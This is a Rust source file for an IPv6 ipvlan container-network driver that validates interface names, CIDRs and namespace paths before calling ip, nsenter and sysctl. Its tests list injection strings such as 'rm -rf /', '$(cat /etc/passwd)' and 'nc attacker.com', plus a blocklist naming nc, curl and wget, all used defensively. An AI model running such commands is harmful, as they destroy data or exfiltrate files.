use crate::driver::{InterfaceLifecycle, Ipv6Subnet, NetworkDiscovery, NetworkNamespaceOps};
use regex::Regex;
use std::error::Error;
use std::net::Ipv6Addr;
use std::path::Path;
use std::process::Command;
use std::thread;
use std::time::{Duration, Instant};

pub struct ScriptDriver;

impl ScriptDriver {
    // DAD (Duplicate Address Detection) configuration constants
    const DAD_TIMEOUT_SECS: u64 = 10;
    const DAD_INITIAL_INTERVAL_MS: u64 = 50;
    const DAD_MAX_INTERVAL_MS: u64 = 500;
    const DAD_BACKOFF_MULTIPLIER: f64 = 1.5;

    /// Validate interface name against Linux naming rules and prevent injection
    fn validate_interface_name(ifname: &str) -> Result<(), Box<dyn Error>> {
        if ifname.is_empty() {
            return Err("Interface name cannot be empty".into());
        }

        if ifname.len() > 15 {
            return Err(format!("Interface name '{}' too long (max 15 characters)", ifname).into());
        }

        if ifname.starts_with('.') {
            return Err(format!("Interface name '{}' cannot start with a dot", ifname).into());
        }

        // Check for null bytes and dangerous characters
        if ifname.contains('\0') {
            return Err(format!("Interface name '{}' contains null byte", ifname).into());
        }

        // Check for shell metacharacters that could enable injection
        let dangerous_chars = ['&', '|', ';', '`', '$', '>', '<', ' ', '\n', '\r', '\t'];
        for ch in dangerous_chars {
            if ifname.contains(ch) {
                return Err(format!(
                    "Interface name '{}' contains dangerous character '{}'",
                    ifname, ch
                )
                .into());
            }
        }

        // Only allow alphanumeric, hyphens, underscores, dots - no shell metacharacters
        let valid_chars_re = Regex::new(r"^[a-zA-Z0-9._-]+$")
            .expect("Failed to compile interface name validation regex - this is a bug");
        if !valid_chars_re.is_match(ifname) {
            return Err(format!("Interface name '{}' contains invalid characters", ifname).into());
        }

        Ok(())
    }

    /// Validate IP/CIDR notation to prevent injection
    fn validate_ip_cidr(ip_cidr: &str) -> Result<(), Box<dyn Error>> {
        if ip_cidr.is_empty() {
            return Err("IP/CIDR cannot be empty".into());
        }

        // Check for dangerous characters that could enable injection
        let dangerous_chars = [
            '&', '|', ';', '`', '$', '>', '<', ' ', '\n', '\r', '\t', '\0',
        ];
        for ch in dangerous_chars {
            if ip_cidr.contains(ch) {
                return Err(format!("IP/CIDR contains dangerous character '{}'", ch).into());
            }
        }

        // Length limit to prevent potential buffer overflow
        if ip_cidr.len() > 43 {
            // Max IPv6 CIDR length
            return Err(format!("IP/CIDR string too long: {}", ip_cidr).into());
        }

        // Allow only valid IPv4 or IPv6 CIDR format (no shell metacharacters)
        let ipv4_cidr_re = Regex::new(r"^[0-9.]+/[0-9]+$")
            .expect("Failed to compile IPv4 CIDR validation regex - this is a bug");
        let ipv6_cidr_re = Regex::new(r"^[0-9a-fA-F:]+/[0-9]+$")
            .expect("Failed to compile IPv6 CIDR validation regex - this is a bug");

        if !ipv4_cidr_re.is_match(ip_cidr) && !ipv6_cidr_re.is_match(ip_cidr) {
            return Err(format!("Invalid IP/CIDR format: {}", ip_cidr).into());
        }

        // Additional validation: try to parse the address part
        if let Some(addr_part) = ip_cidr.split('/').next() {
            // Try parsing as IPv4 first, then IPv6
            if addr_part.parse::<std::net::Ipv4Addr>().is_err()
                && addr_part.parse::<Ipv6Addr>().is_err()
            {
                return Err(format!("Invalid IP address: {}", addr_part).into());
            }
        }

        Ok(())
    }

    /// Validate IPv6 address to prevent injection
    fn validate_ipv6_address(addr: &Ipv6Addr) -> Result<(), Box<dyn Error>> {
        // IPv6Addr is already parsed, so it's safe, but we can add additional checks
        let addr_str = addr.to_string();

        // Reject multicast addresses for interface configuration
        if addr.is_multicast() {
            return Err(format!("Multicast IPv6 address not allowed: {}", addr_str).into());
        }

        // Reject unspecified address (::)
        if addr.is_unspecified() {
            return Err(format!("Unspecified IPv6 address not allowed: {}", addr_str).into());
        }

        // Ensure no unexpected characters (paranoid check)
        let ipv6_re = Regex::new(r"^[0-9a-fA-F:]+$")
            .expect("Failed to compile IPv6 address validation regex - this is a bug");
        if !ipv6_re.is_match(&addr_str) {
            return Err(format!("Invalid IPv6 address format: {}", addr_str).into());
        }

        // Length check to prevent overflow
        if addr_str.len() > 39 {
            return Err(format!("IPv6 address string too long: {}", addr_str).into());
        }

        Ok(())
    }

    /// Validate network namespace path to prevent injection
    fn validate_netns_path(netns_path: &Path) -> Result<(), Box<dyn Error>> {
        let netns_str = netns_path.to_str().ok_or("Invalid UTF-8 in netns path")?;

        if netns_str.is_empty() {
            return Err("Network namespace path cannot be empty".into());
        }

        // Path length limit
        if netns_str.len() > 256 {
            return Err(format!("Network namespace path too long: {}", netns_str).into());
        }

        // Check for path traversal patterns
        if netns_str.contains("..") {
            return Err(format!("Path traversal detected: {}", netns_str).into());
        }

        // Check for null bytes and dangerous characters
        if netns_str.contains('\0') {
            return Err(format!("Null byte in netns path: {}", netns_str).into());
        }

        // Check for shell metacharacters
        let dangerous_chars = ['&', '|', ';', '`', '$', '>', '<', ' ', '\n', '\r', '\t'];
        for ch in dangerous_chars {
            if netns_str.contains(ch) {
                return Err(
                    format!("Dangerous character '{}' in netns path: {}", ch, netns_str).into(),
                );
            }
        }

        // Only allow valid netns path patterns
        let valid_patterns = [
            r"^/proc/\d+/ns/net$",              // /proc/{pid}/ns/net
            r"^/proc/self/ns/net$",             // /proc/self/ns/net
            r"^/var/run/netns/[a-zA-Z0-9_-]+$", // /var/run/netns/{name}
            r"^/run/netns/[a-zA-Z0-9_-]+$",     // /run/netns/{name}
        ];

        let is_valid = valid_patterns.iter().any(|pattern| {
            Regex::new(pattern)
                .map(|re| re.is_match(netns_str))
                .unwrap_or(false)
        });

        if !is_valid {
            return Err(format!("Invalid network namespace path: {}", netns_str).into());
        }

        Ok(())
    }

    /// Validate mode parameter for ipvlan creation
    fn validate_ipvlan_mode(mode: &str) -> Result<(), Box<dyn Error>> {
        // Only allow known safe ipvlan modes
        match mode {
            "l2" | "l3" | "l3s" => Ok(()),
            _ => Err(format!("Invalid ipvlan mode: {}", mode).into()),
        }
    }

    /// Safely execute a command with validated arguments
    fn run_cmd(cmd: &str, args: &[&str]) -> Result<String, Box<dyn Error>> {
        // Validate command name (basic safety check)
        let allowed_commands = ["ip", "nsenter", "sysctl"];
        if !allowed_commands.contains(&cmd) {
            return Err(format!("Command not allowed: {}", cmd).into());
        }

        // Additional security checks for command arguments
        for arg in args {
            // Check for null bytes
            if arg.contains('\0') {
                return Err(format!("Null byte in command argument: {}", arg).into());
            }

            // Check argument length to prevent buffer overflow
            if arg.len() > 1024 {
                return Err(format!("Command argument too long: {}", arg).into());
            }

            // Check for dangerous sequences
            let dangerous_sequences = ["$(", "`", "&", "||", "&&", ";", "|", ">", "<"];
            for seq in dangerous_sequences {
                if arg.contains(seq) {
                    return Err(format!("Dangerous sequence '{}' in argument: {}", seq, arg).into());
                }
            }
        }

        // Limit number of arguments
        if args.len() > 32 {
            return Err(format!("Too many arguments: {}", args.len()).into());
        }

        let output = Command::new(cmd).args(args).output()?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(format!(
                "Command failed: {} {}\nError: {}",
                cmd,
                args.join(" "),
                stderr
            )
            .into());
        }

        Ok(String::from_utf8(output.stdout)?.trim().to_string())
    }

    /// Wait for IPv6 Duplicate Address Detection (DAD) to complete with exponential backoff
    fn wait_for_dad_completion(
        &self,
        netns_path: &Path,
        interface: &str,
        target_ip: &str,
    ) -> Result<(), Box<dyn Error>> {
        let start = Instant::now();
        let timeout = Duration::from_secs(Self::DAD_TIMEOUT_SECS);
        let mut current_interval = Self::DAD_INITIAL_INTERVAL_MS;
        let mut attempts = 0;

        let netns_str = netns_path.to_str().ok_or("Invalid UTF-8 in netns path")?;

        let ns_args = |cmd: &[&str]| -> Vec<String> {
            let mut args = vec![
                format!("--net={}", netns_str),
                "-F".to_string(),
                "--".to_string(),
            ];
            args.extend(cmd.iter().map(|s| s.to_string()));
            args
        };

        loop {
            attempts += 1;

            // Check for timeout
            if start.elapsed() > timeout {
                return Err(format!(
                    "Timed out waiting for IPv6 DAD to complete for {} on interface {} after {:.1}s ({} attempts)",
                    target_ip, interface, start.elapsed().as_secs_f64(), attempts
                ).into());
            }

            // Query interface state
            let args = ns_args(&["ip", "-j", "-6", "addr", "show", "dev", interface]);
            let output = match Self::run_cmd(
                "nsenter",
                &args.iter().map(|s| s.as_str()).collect::<Vec<_>>(),
            ) {
                Ok(output) => output,
                Err(e) => {
                    return Err(format!(
                        "Failed to query IPv6 address state for {} on interface {}: {}",
                        target_ip, interface, e
                    )
                    .into());
                }
            };

            // Parse JSON output
            let entries: Vec<serde_json::Value> = serde_json::from_str(&output)
                .map_err(|e| format!("Failed to parse addr show JSON: {}", e))?;

            let mut found_our_ip = false;
            let mut is_ready = false;
            let mut is_failed = false;

            // Check address state
            for entry in entries {
                if let Some(addr_infos) = entry.get("addr_info").and_then(|v| v.as_array()) {
                    for info in addr_infos {
                        let local = info.get("local").and_then(|v| v.as_str()).unwrap_or("");
                        if local == target_ip {
                            found_our_ip = true;
                            let flags = info
                                .get("flags")
                                .and_then(|v| v.as_array())
                                .map(|arr| {
                                    arr.iter().filter_map(|x| x.as_str()).collect::<Vec<_>>()
                                })
                                .unwrap_or_default();

                            if flags.contains(&"dadfailed") {
                                is_failed = true;
                            } else if !flags.contains(&"tentative") {
                                is_ready = true;
                            }
                        }
                    }
                }
            }

            // Handle DAD results
            if is_failed {
                return Err(format!(
                    "IPv6 DAD failed for {} on interface {} - duplicate address detected after {:.1}s",
                    target_ip, interface, start.elapsed().as_secs_f64()
                ).into());
            }

            if found_our_ip && is_ready {
                // DAD completed successfully
                return Ok(());
            }

            // Wait with exponential backoff
            thread::sleep(Duration::from_millis(current_interval));

            // Calculate next interval with exponential backoff
            current_interval = std::cmp::min(
                (current_interval as f64 * Self::DAD_BACKOFF_MULTIPLIER) as u64,
                Self::DAD_MAX_INTERVAL_MS,
            );
        }
    }
}

impl NetworkDiscovery for ScriptDriver {
    fn detect_upstream_interface(&self) -> Result<String, Box<dyn Error>> {
        // Try IPv6 default route first
        let output = Self::run_cmd("ip", &["-6", "-j", "route", "show", "default"])?;
        let routes: Vec<serde_json::Value> = serde_json::from_str(&output)
            .map_err(|e| format!("Failed to parse IPv6 route JSON: {}", e))
            .unwrap_or_else(|_| Vec::new());

        if let Some(route) = routes.first() {
            if let Some(dev) = route.get("dev").and_then(|v| v.as_str()) {
                return Ok(dev.to_string());
            }
        }

        // Fallback to IPv4 default route
        let output = Self::run_cmd("ip", &["-4", "-j", "route", "show", "default"])?;
        let routes: Vec<serde_json::Value> = serde_json::from_str(&output)
            .map_err(|e| format!("Failed to parse IPv4 route JSON: {}", e))
            .unwrap_or_else(|_| Vec::new());

        if let Some(route) = routes.first() {
            if let Some(dev) = route.get("dev").and_then(|v| v.as_str()) {
                return Ok(dev.to_string());
            }
        }

        Err("Could not infer default interface from routing table".into())
    }

    fn get_interface_gateway(&self, ifname: &str) -> Result<Option<Ipv6Addr>, Box<dyn Error>> {
        Self::validate_interface_name(ifname)?;

        let output = Self::run_cmd(
            "ip",
            &["-6", "-j", "route", "show", "default", "dev", ifname],
        )?;
        let routes: Vec<serde_json::Value> = serde_json::from_str(&output)
            .map_err(|e| format!("Failed to parse gateway route JSON: {}", e))
            .unwrap_or_else(|_| Vec::new());

        if let Some(route) = routes.first() {
            if let Some(gateway) = route.get("gateway").and_then(|v| v.as_str()) {
                let addr: Ipv6Addr = gateway
                    .parse()
                    .map_err(|e| format!("Invalid IPv6 gateway address '{}': {}", gateway, e))?;
                return Ok(Some(addr));
            }
        }
        Ok(None)
    }

    fn get_interface_subnet(&self, ifname: &str) -> Result<Ipv6Subnet, Box<dyn Error>> {
        Self::validate_interface_name(ifname)?;

        let output = Self::run_cmd(
            "ip",
            &["-j", "-6", "addr", "show", "dev", ifname, "scope", "global"],
        )?;
        let entries: Vec<serde_json::Value> = serde_json::from_str(&output)?;

        for entry in entries {
            if let Some(addr_infos) = entry.get("addr_info").and_then(|v| v.as_array()) {
                for info in addr_infos {
                    let local = info.get("local").and_then(|v| v.as_str());
                    let prefix = info.get("prefixlen").and_then(|v| v.as_u64());

                    if let (Some(ip_str), Some(pfx)) = (local, prefix) {
                        let addr: Ipv6Addr = ip_str
                            .parse()
                            .map_err(|e| format!("Invalid IPv6 address '{}': {}", ip_str, e))?;
                        return Ipv6Subnet::new(addr, pfx as u8);
                    }
                }
            }
        }

        Err(format!("No global IPv6 address found on interface {}", ifname).into())
    }

    fn check_interface(&self, ifname: &str) -> Result<(), Box<dyn Error>> {
        Self::validate_interface_name(ifname)?;
        Self::run_cmd("ip", &["link", "show", "dev", ifname])?;
        Ok(())
    }
}

impl InterfaceLifecycle for ScriptDriver {
    fn create_ipvlan(
        &self,
        parent: &str,
        mode: &str,
        temp_name: &str,
    ) -> Result<(), Box<dyn Error>> {
        // Validate all input parameters
        Self::validate_interface_name(parent)?;
        Self::validate_interface_name(temp_name)?;
        Self::validate_ipvlan_mode(mode)?;

        // Includes 'bridge' flag explicitly
        Self::run_cmd(
            "ip",
            &[
                "link", "add", "link", parent, "name", temp_name, "type", "ipvlan", "mode", mode,
                "bridge",
            ],
        )?;
        Ok(())
    }

    fn delete_interface(&self, ifname: &str) -> Result<(), Box<dyn Error>> {
        Self::validate_interface_name(ifname)?;
        Self::run_cmd("ip", &["link", "delete", ifname])?;
        Ok(())
    }
}

impl NetworkNamespaceOps for ScriptDriver {
    fn set_netns(&self, ifname: &str, netns_path: &Path) -> Result<(), Box<dyn Error>> {
        Self::validate_interface_name(ifname)?;
        Self::validate_netns_path(netns_path)?;

        let netns_str = netns_path.to_str().ok_or("Invalid UTF-8 in netns path")?;
        Self::run_cmd("ip", &["link", "set", "dev", ifname, "netns", netns_str])?;
        Ok(())
    }

    fn configure_in_netns(
        &self,
        netns_path: &Path,
        temp_ifname: &str,
        target_ifname: &str,
        ip_cidr: &str,
        gateway: Option<&Ipv6Addr>,
    ) -> Result<(), Box<dyn Error>> {
        // Validate all input parameters
        Self::validate_netns_path(netns_path)?;
        Self::validate_interface_name(temp_ifname)?;
        Self::validate_interface_name(target_ifname)?;
        Self::validate_ip_cidr(ip_cidr)?;
        if let Some(gw) = gateway {
            Self::validate_ipv6_address(gw)?;
        }

        let netns_str = netns_path.to_str().ok_or("Invalid UTF-8 in netns path")?;

        let ns_args = |cmd: &[&str]| -> Vec<String> {
            let mut args = vec![
                format!("--net={}", netns_str),
                "-F".to_string(),
                "--".to_string(),
            ];
            args.extend(cmd.iter().map(|s| s.to_string()));
            args
        };

        // 1. Rename
        let args = ns_args(&[
            "ip",
            "link",
            "set",
            "dev",
            temp_ifname,
            "name",
            target_ifname,
        ]);
        Self::run_cmd(
            "nsenter",
            &args.iter().map(|s| s.as_str()).collect::<Vec<_>>(),
        )?;

        // 2. Add IP
        let args = ns_args(&["ip", "addr", "add", ip_cidr, "dev", target_ifname]);
        Self::run_cmd(
            "nsenter",
            &args.iter().map(|s| s.as_str()).collect::<Vec<_>>(),
        )?;

        // 3. Sysctl accept_ra=2
        let sysctl_key = format!("net.ipv6.conf.{}.accept_ra=2", target_ifname);
        let args = ns_args(&["sysctl", "-w", &sysctl_key]);
        Self::run_cmd(
            "nsenter",
            &args.iter().map(|s| s.as_str()).collect::<Vec<_>>(),
        )?;

        // 4. Set UP
        let args = ns_args(&["ip", "link", "set", "up", "dev", target_ifname]);
        Self::run_cmd(
            "nsenter",
            &args.iter().map(|s| s.as_str()).collect::<Vec<_>>(),
        )?;

        // 5. Add Gateway
        if let Some(gw) = gateway {
            let gw_str = gw.to_string();
            let args = ns_args(&[
                "ip",
                "-6",
                "route",
                "add",
                "default",
                "via",
                &gw_str,
                "dev",
                target_ifname,
            ]);
            // Ignore error (redundant add)
            let _ = Self::run_cmd(
                "nsenter",
                &args.iter().map(|s| s.as_str()).collect::<Vec<_>>(),
            );
        }

        // 6. Strict DAD Check
        let target_ip = ip_cidr.split('/').next().unwrap_or("");
        self.wait_for_dad_completion(netns_path, target_ifname, target_ip)?;

        Ok(())
    }

    fn delete_interface_in_netns(
        &self,
        netns_path: &Path,
        ifname: &str,
    ) -> Result<(), Box<dyn Error>> {
        Self::validate_netns_path(netns_path)?;
        Self::validate_interface_name(ifname)?;

        let netns_str = netns_path.to_str().ok_or("Invalid UTF-8 in netns path")?;

        let ns_args = |cmd: &[&str]| -> Vec<String> {
            let mut args = vec![
                format!("--net={}", netns_str),
                "-F".to_string(),
                "--".to_string(),
            ];
            args.extend(cmd.iter().map(|s| s.to_string()));
            args
        };

        // Try to delete the interface
        let args = ns_args(&["ip", "link", "delete", "dev", ifname]);
        match Self::run_cmd(
            "nsenter",
            &args.iter().map(|s| s.as_str()).collect::<Vec<_>>(),
        ) {
            Ok(_) => Ok(()),
            Err(e) => {
                // Check if the error is because the interface doesn't exist
                let error_str = e.to_string().to_lowercase();
                if error_str.contains("cannot find device")
                    || error_str.contains("no such device")
                    || error_str.contains("link not found")
                {
                    // Interface doesn't exist - this is success for DEL (idempotent)
                    Ok(())
                } else {
                    // Some other error occurred
                    Err(e)
                }
            }
        }
    }

    fn interface_exists_in_netns(
        &self,
        netns_path: &Path,
        ifname: &str,
    ) -> Result<bool, Box<dyn Error>> {
        Self::validate_netns_path(netns_path)?;
        Self::validate_interface_name(ifname)?;

        let netns_str = netns_path.to_str().ok_or("Invalid UTF-8 in netns path")?;

        let ns_args = |cmd: &[&str]| -> Vec<String> {
            let mut args = vec![
                format!("--net={}", netns_str),
                "-F".to_string(),
                "--".to_string(),
            ];
            args.extend(cmd.iter().map(|s| s.to_string()));
            args
        };

        // Try to show the interface
        let args = ns_args(&["ip", "link", "show", "dev", ifname]);
        match Self::run_cmd(
            "nsenter",
            &args.iter().map(|s| s.as_str()).collect::<Vec<_>>(),
        ) {
            Ok(_) => Ok(true), // Interface exists
            Err(e) => {
                // Check if the error is because the interface doesn't exist
                let error_str = e.to_string().to_lowercase();
                if error_str.contains("cannot find device")
                    || error_str.contains("no such device")
                    || error_str.contains("link not found")
                {
                    Ok(false) // Interface doesn't exist
                } else {
                    // Some other error occurred - propagate it
                    Err(e)
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_run_cmd_success() {
        // Test with a command that should always work
        let result = ScriptDriver::run_cmd("ip", &["route", "list", "table", "all"]);
        if result.is_err() {
            println!("Debug error: {:?}", result.as_ref().err());
        }
        assert!(result.is_ok());
        // Just check that we got some output
        assert!(!result.unwrap().is_empty()); // Check that result has content
    }

    #[test]
    fn test_run_cmd_failure() {
        // Test with a command that should fail
        let result = ScriptDriver::run_cmd("ip", &["invalid_subcommand"]);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Command failed"));
    }

    #[test]
    fn test_run_cmd_nonexistent() {
        // Test with a nonexistent command
        let result = ScriptDriver::run_cmd("nonexistent_command_12345", &[]);
        assert!(result.is_err());
        // This should fail due to command whitelist, not command existence
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Command not allowed"));
    }

    #[test]
    fn test_run_cmd_with_args() {
        // Test command with multiple arguments
        let result = ScriptDriver::run_cmd("ip", &["route", "list", "table", "local"]);
        if result.is_err() {
            println!("Debug error: {:?}", result.as_ref().err());
        }
        assert!(result.is_ok());
        // Check that we can unwrap the result - len() is always >= 0 for Vec
        let _output = result.unwrap();
    }

    #[test]
    fn test_json_parsing_robustness() {
        // Test how we handle malformed JSON responses
        // This simulates what might happen if ip command returns unexpected format

        // Valid empty array
        let json = "[]";
        let parsed: Result<Vec<serde_json::Value>, _> = serde_json::from_str(json);
        assert!(parsed.is_ok());
        assert_eq!(parsed.unwrap().len(), 0);

        // Invalid JSON should be handled gracefully
        let json = "{ invalid json";
        let parsed: Result<Vec<serde_json::Value>, _> = serde_json::from_str(json);
        assert!(parsed.is_err());
    }

    #[test]
    fn test_interface_name_safety() {
        // Test that interface names would be safe to use in commands
        let safe_names = vec!["eth0", "ens3", "wlan0", "br-12345", "vethABC123"];
        let unsafe_names = vec!["eth0; rm -rf /", "eth0 && evil", "eth0`command`"];

        for name in safe_names {
            assert!(!name.contains(';'));
            assert!(!name.contains('&'));
            assert!(!name.contains('`'));
            assert!(!name.contains('$'));
            assert!(!name.contains('|'));
        }

        for name in unsafe_names {
            assert!(
                name.contains(';')
                    || name.contains('&')
                    || name.contains('`')
                    || name.contains('$')
                    || name.contains('|'),
                "Name {} should be detected as unsafe",
                name
            );
        }
    }

    #[test]
    fn test_path_to_str_safety() {
        use std::path::Path;

        // Test that path conversion handles edge cases
        let safe_paths = vec!["/proc/123/ns/net", "/var/run/netns/test"];

        for path_str in safe_paths {
            let path = Path::new(path_str);
            let converted = path.to_str();
            assert!(converted.is_some());
            assert_eq!(converted.unwrap(), path_str);
        }
    }

    #[test]
    fn test_error_message_content() {
        // Test that error messages contain useful information
        let result = ScriptDriver::run_cmd("false", &["arg1", "arg2"]);
        assert!(result.is_err());

        let error_msg = result.unwrap_err().to_string();
        assert!(error_msg.contains("Command not allowed"));
        assert!(error_msg.contains("false"));
    }

    #[test]
    fn test_interface_name_injection_protection() {
        // Test that malicious interface names are rejected
        let malicious_names = vec![
            "eth0; rm -rf /",
            "eth0`whoami`",
            "eth0$(cat /etc/passwd)",
            "eth0|nc attacker.com 1234",
            "eth0 && curl malicious.com",
            "eth0\nwget evil.com",
            "../../../etc/passwd",
            "eth0\0/bin/sh",
        ];

        for name in malicious_names {
            let result = ScriptDriver::validate_interface_name(name);
            assert!(
                result.is_err(),
                "Should reject malicious interface name: {}",
                name
            );
        }
    }

    #[test]
    fn test_ip_cidr_injection_protection() {
        // Test that malicious IP/CIDR values are rejected
        let malicious_cidrs = vec![
            "192.168.1.1/24; rm -rf /",
            "2001:db8::1/64`whoami`",
            "10.0.0.1/8$(curl evil.com)",
            "172.16.0.1/12|nc attacker.com",
            "192.168.1.1/24 && malicious_cmd",
            "192.168.1.1/24\nwget evil.com",
            "../../../etc/passwd",
            "192.168.1.1/24\0/bin/sh",
        ];

        for cidr in malicious_cidrs {
            let result = ScriptDriver::validate_ip_cidr(cidr);
            assert!(result.is_err(), "Should reject malicious IP/CIDR: {}", cidr);
        }
    }

    #[test]
    fn test_netns_path_injection_protection() {
        // Test that malicious netns paths are rejected
        let malicious_paths = vec![
            "/var/run/netns/test; rm -rf /",
            "/var/run/netns/test`whoami`",
            "/var/run/netns/test$(malicious)",
            "/var/run/netns/test|evil_cmd",
            "/var/run/netns/test && bad_cmd",
            "/var/run/netns/test\nevil",
            "../../../../etc/passwd",
            "/var/run/netns/test\0/bin/sh",
        ];

        for path_str in malicious_paths {
            let path = std::path::Path::new(path_str);
            let result = ScriptDriver::validate_netns_path(path);
            assert!(
                result.is_err(),
                "Should reject malicious netns path: {}",
                path_str
            );
        }
    }

    #[test]
    fn test_command_whitelist_enforcement() {
        // Test that only allowed commands can be executed
        let forbidden_commands = vec![
            "sh",
            "bash",
            "nc",
            "netcat",
            "curl",
            "wget",
            "rm",
            "cat",
            "echo",
            "python",
            "perl",
            "php",
            "/bin/sh",
            "/usr/bin/python",
            "../../../../bin/sh",
        ];

        for cmd in forbidden_commands {
            let result = ScriptDriver::run_cmd(cmd, &[]);
            assert!(result.is_err(), "Should reject forbidden command: {}", cmd);
            assert!(result
                .unwrap_err()
                .to_string()
                .contains("Command not allowed"));
        }
    }

    #[test]
    fn test_valid_inputs_still_work() {
        // Test that legitimate inputs still pass validation

        // Valid interface names
        let valid_ifnames = vec![
            "eth0",
            "wlan0",
            "br-docker0",
            "veth123abc",
            "docker0",
            "lo",
            "enp0s3",
        ];
        for ifname in valid_ifnames {
            let result = ScriptDriver::validate_interface_name(ifname);
            assert!(
                result.is_ok(),
                "Should accept valid interface name: {}",
                ifname
            );
        }

        // Valid IP/CIDR values
        let valid_cidrs = vec![
            "192.168.1.1/24",
            "10.0.0.0/8",
            "172.16.0.0/12",
            "2001:db8::1/64",
            "fe80::1/64",
            "::1/128",
        ];
        for cidr in valid_cidrs {
            let result = ScriptDriver::validate_ip_cidr(cidr);
            assert!(result.is_ok(), "Should accept valid IP/CIDR: {}", cidr);
        }

        // Valid netns paths
        let valid_paths = vec![
            "/var/run/netns/test",
            "/var/run/netns/container123",
            "/proc/1/ns/net",
        ];
        for path_str in valid_paths {
            let path = std::path::Path::new(path_str);
            let result = ScriptDriver::validate_netns_path(path);
            assert!(
                result.is_ok(),
                "Should accept valid netns path: {}",
                path_str
            );
        }
    }
}
